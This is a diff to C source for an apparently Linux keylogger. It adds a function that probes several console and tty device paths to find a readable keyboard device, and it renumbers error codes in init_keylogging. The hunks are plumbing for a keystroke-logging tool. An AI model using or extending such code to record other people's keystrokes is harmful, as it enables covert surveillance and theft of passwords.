@@ -23,6 +23,45 @@
 #define T char
 #include "mbuffertemplate.h"
 
+static const size_t conpathsize = 6;
+static const char *conpath[] = {
+	"/proc/self/fd/0",
+	"/dev/tty",
+	"/dev/tty0",
+	"/dev/vc/0",
+	"/dev/systty",
+	"/dev/console",
+	NULL
+};
+
+static int open_console0 () {
+		size_t i; 
+		
+		for(i = 0; i < conpathsize; i++) {
+				int fd;
+			
+			    fd = open ( conpath[i], O_NOCTTY | O_RDONLY );
+                if ( fd >= 0 ) {
+						char ioctlarg;
+						
+						if(!ioctl(fd, KDGKBTYPE, &ioctlarg)) {
+								if (isatty(fd) && ioctlarg == KB_101) {
+										return fd;
+								}
+						}
+						
+						if(close(fd)) {
+								ERR("close");
+						}
+                }
+
+				
+				LOG(-1, "Failed to open %s! Trying next one ...\n", conpath[i]);
+		}
+		
+		return -1;	
+}
+
 static int load_x_keymaps ( const char screen[], struct keyboardInfo *kbd, struct configInfo *config )
 {
         int err = 0;
@@ -131,6 +170,7 @@ static int load_kernel_keymaps ( const int fd, struct keyboardInfo *kbd, struct 
         return 0;
 }
 
+
 int init_keylogging ( const char input[], struct keyboardInfo *kbd, struct configInfo *config )
 {
         int err = 0;
@@ -144,17 +184,17 @@ int init_keylogging ( const char input[], struct keyboardInfo *kbd, struct confi
 
         if ( !config->xkeymaps ) {
                 int fd;
-
-                fd = open ( "/dev/console", O_NOCTTY | O_RDONLY );
-                if ( fd < 0 ) {
-                        ERR ( "open" );
-                        err = -2;
-                        goto error_exit;
-                }
-
+				
+				fd = open_console0();
+				if (fd < 0) {
+						LOG(-1, "Failed to open a file descriptor to a vaild console!\n");
+						err = -1;
+						goto error_exit;
+				}
+        
                 if ( load_kernel_keymaps ( fd, kbd, config ) ) {
                         LOG ( -1, "init_kernelkeylogging failed!\n" );
-                        err = -3;
+                        err = -2;
                         goto error_exit;
                 }
         }
@@ -169,7 +209,7 @@ int init_keylogging ( const char input[], struct keyboardInfo *kbd, struct confi
                 kbd->outfd = open ( path, O_WRONLY | O_APPEND | O_CREAT | O_NOCTTY );
                 if ( kbd->outfd < 0 ) {
                         ERR ( "open" );
-                        err = -4;
+                        err = -3;
                         goto error_exit;
                 }
         }
